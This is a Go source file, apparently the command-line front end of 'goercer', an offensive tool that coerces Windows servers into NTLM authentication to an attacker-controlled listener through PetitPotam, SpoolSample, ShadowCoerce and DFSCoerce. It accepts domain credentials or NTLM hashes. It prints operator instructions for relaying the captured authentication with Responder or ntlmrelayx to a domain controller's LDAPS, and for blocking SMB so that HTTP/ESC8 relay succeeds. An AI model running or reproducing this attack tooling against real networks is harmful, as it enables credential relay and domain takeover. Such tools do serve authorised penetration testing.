package cli

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"syscall"

	"github.com/mjwhitta/cli"
	"golang.org/x/term"

	"goercer/internal/callback"
	"goercer/internal/config"
)

// Parse reads command-line flags into a validated, fully-resolved Config.
// It owns every os.Exit that the original main() performed inline so that
// main.go stays a thin entrypoint.
func Parse() *config.Config {
	cfg := config.New()

	var (
		pipe     string
		useHTTP  bool
		proxyURL string
		opnum    int
		verbose  bool
		fireAll  bool
		jsonOut  bool
	)

	cli.Align = true
	cli.Banner = "goercer [OPTIONS]"
	cli.Info("Coerces Windows servers to authenticate to an attacker-controlled listener")
	cli.Authors = []string{"ineffectivecoder"}

	cli.Flag(&cfg.TargetIP, "t", "target", "", "Target server IP address")
	cli.Flag(&cfg.Listener, "l", "listener", "", "Listener IP or hostname for callback; HTTP mode accepts IP@PORT/path (e.g. 10.1.1.99@80/test)")
	cli.Flag(&cfg.User, "u", "user", "", "Domain username")
	cli.Flag(&cfg.Domain, "d", "domain", "", "Domain name")
	cli.Flag(&cfg.Password, "p", "password", "", "Password (prompted if not provided)")
	cli.Flag(&cfg.Hash, "H", "hash", "", "NTLM hash (32 hex characters)")
	cli.Flag(&cfg.Method, "m", "method", "petitpotam", "Coercion method: petitpotam, spoolsample, shadowcoerce, dfscoerce")
	cli.Flag(&pipe, "pipe", "efsrpc", "Named pipe (petitpotam only): efsrpc, lsarpc, samr, netlogon, lsass")
	cli.Flag(&opnum, "opnum", -1, "Test a specific opnum only; default tries all")
	cli.Flag(&proxyURL, "proxy", "", "SOCKS5 proxy URL (e.g. socks5://127.0.0.1:1080)")
	cli.Flag(&verbose, "v", "verbose", false, "Enable verbose/debug output")
	cli.Flag(&fireAll, "a", "all", false, "Fire all opnums and path variations (default stops after first success)")
	cli.Flag(&useHTTP, "http", false, "Use HTTP URL for coercion instead of UNC path (for HTTP relay attacks like ESC8)")
	cli.Flag(&jsonOut, "j", "json", false, "Emit results as JSON on stdout")

	cli.Parse()

	cfg.Verbose = verbose
	cfg.FireAll = fireAll
	cfg.JSON = jsonOut
	cfg.Opnum = opnum
	cfg.ProxyURL = proxyURL
	cfg.Pipe = normalizePipe(pipe)
	if useHTTP {
		cfg.Mode = config.ModeHTTP
	}

	validateBasics(cfg)
	validateHash(cfg)
	normalizeHTTPListener(cfg)
	resolveCredentials(cfg)

	if err := cfg.Validate(); err != nil {
		fmt.Printf("[!] Error: %v\n", err)
		cli.Usage(1)
	}

	if cfg.ProxyURL != "" {
		if !strings.HasPrefix(cfg.ProxyURL, "socks5://") {
			fatal("proxy URL must start with 'socks5://'")
		}
		host := strings.TrimPrefix(cfg.ProxyURL, "socks5://")
		if !strings.Contains(host, ":") {
			fatal("proxy URL must include a port (e.g. socks5://127.0.0.1:1080)")
		}
	}

	return cfg
}

// normalizePipe lowercases and maps short names onto real Windows pipe names,
// matching the original tool.
func normalizePipe(pipe string) string {
	pipe = strings.ToLower(pipe)
	switch pipe {
	case "efsr":
		return "efsrpc"
	default:
		return pipe
	}
}

// validateBasics enforces the invariant that the target is a valid IPv4 when
// in UNC mode (hostnames are also accepted when provided, but the original
// strictly required an IPv4 target).
func validateBasics(cfg *config.Config) {
	if cfg.TargetIP == "" {
		fatal("missing required flag: -t (target)")
	}
	if !isValidIP(cfg.TargetIP) {
		fatal("invalid target IP address: " + cfg.TargetIP)
	}
	if cfg.Listener == "" {
		fatal("missing required flag: -l (listener)")
	}
	if cfg.User == "" {
		fatal("missing required flag: -u (user)")
	}
	if cfg.Domain == "" {
		fatal("missing required flag: -d (domain)")
	}
	if !isValidMethod(cfg.Method) {
		fatal("invalid method '" + cfg.Method + "' (valid: petitpotam, spoolsample, shadowcoerce, dfscoerce)")
	}
}

// validateHash checks the NTLM hash format when one was supplied.
func validateHash(cfg *config.Config) {
	if cfg.Hash != "" && !isNTLMHash(cfg.Hash) {
		fatal("invalid NTLM hash format (must be 32 hex characters)")
	}
}

// normalizeHTTPListener rewrites the listener into WebDAV form when running in
// HTTP mode, mirroring the original tool's convenience logic. It also warns
// about the two WebClient gotchas that silently break HTTP coercion.
func normalizeHTTPListener(cfg *config.Config) {
	if cfg.Mode != config.ModeHTTP {
		return
	}
	if cfg.Listener == "" {
		fatal("listener required for HTTP mode")
	}
	if !strings.Contains(cfg.Listener, "@") {
		cfg.Listener = callback.AutoWebDAV(cfg.Listener)
		fmt.Printf("[+] HTTP/WebDAV mode: auto-constructed listener path: %s\n", cfg.Listener)
	}

	// A bare-IP listener never triggers WebClient: Windows only treats hostnames
	// as web paths, so an IP silently falls back to SMB with no HTTP callback.
	if hostIsIP(cfg.Listener) {
		fmt.Println("[!] WARNING: Listener is an IP address - WebClient will NOT trigger HTTP.")
		fmt.Println("[!]   WebClient only activates for hostnames, not bare IPs.")
		fmt.Println("[!]   Use a hostname that resolves to your listener (DNS A record or")
		fmt.Println("[!]   a hosts entry on the target) instead of an IP.")
	}

	printHTTPSetup(cfg)
}

// hostIsIP reports whether the host portion of a listener (the part before any
// '@' in WebDAV form) is a bare IPv4 address.
func hostIsIP(listener string) bool {
	host := listener
	if i := strings.IndexByte(listener, '@'); i >= 0 {
		host = listener[:i]
	}
	return isValidIP(host)
}

// resolveCredentials prompts for a password/hash when neither was provided,
// and detects whether the prompted input is actually an NTLM hash.
func resolveCredentials(cfg *config.Config) {
	if cfg.Password == "" && cfg.Hash == "" {
		input := promptSecret("Enter password or NTLM hash: ")
		if isNTLMHash(input) {
			cfg.Hash = input
			cfg.Password = ""
		} else {
			cfg.Password = input
		}
	}
}

func isValidMethod(m string) bool {
	switch m {
	case "petitpotam", "spoolsample", "shadowcoerce", "dfscoerce":
		return true
	}
	return false
}

func isValidIP(ip string) bool {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return false
	}
	for _, part := range parts {
		if len(part) == 0 || len(part) > 3 {
			return false
		}
		num := 0
		for _, c := range part {
			if c < '0' || c > '9' {
				return false
			}
			num = num*10 + int(c-'0')
		}
		if num > 255 {
			return false
		}
	}
	return true
}

func isNTLMHash(s string) bool {
	if len(s) != 32 {
		return false
	}
	for _, c := range s {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

func fatal(msg string) {
	fmt.Printf("[!] Error: %s\n", msg)
	cli.Usage(1)
}

func promptSecret(prompt string) string {
	fmt.Print(prompt)
	if term.IsTerminal(int(syscall.Stdin)) {
		b, err := term.ReadPassword(int(syscall.Stdin))
		fmt.Println()
		if err != nil {
			fatal("failed to read password: " + err.Error())
		}
		return string(b)
	}
	r := bufio.NewReader(os.Stdin)
	input, err := r.ReadString('\n')
	if err != nil {
		fatal("failed to read input: " + err.Error())
	}
	return strings.TrimSpace(input)
}

func printHTTPSetup(cfg *config.Config) {
	fmt.Printf("[+] Example path that will be sent: \\\\%s\\test\\Settings.ini\n", cfg.Listener)
	fmt.Println("[!] IMPORTANT: WebClient service must be running on target")
	fmt.Println("[!]   - Check: sc query webclient")
	fmt.Println("[!]   - Start: sc start webclient")
	fmt.Println("[!]")
	fmt.Println("[!] Listener setup (choose one):")
	fmt.Println("[!]   - Responder: sudo responder -I eth0 -wv")
	fmt.Println("[!]   - ntlmrelayx: sudo ntlmrelayx.py -t ldaps://dc.domain.com --http-port 80")
	fmt.Println("[!]")
	fmt.Println("[!] CRITICAL: Ensure SMB (port 445) is BLOCKED on your listener (Windows tries SMB first)")
	fmt.Println("[!]   - Run: sudo iptables -A INPUT -p tcp --dport 445 -j DROP")
	fmt.Println("[!]")
	fmt.Println("[!] NOTE: SpoolSample (-m spoolsample) often works better for HTTP coercion")
}
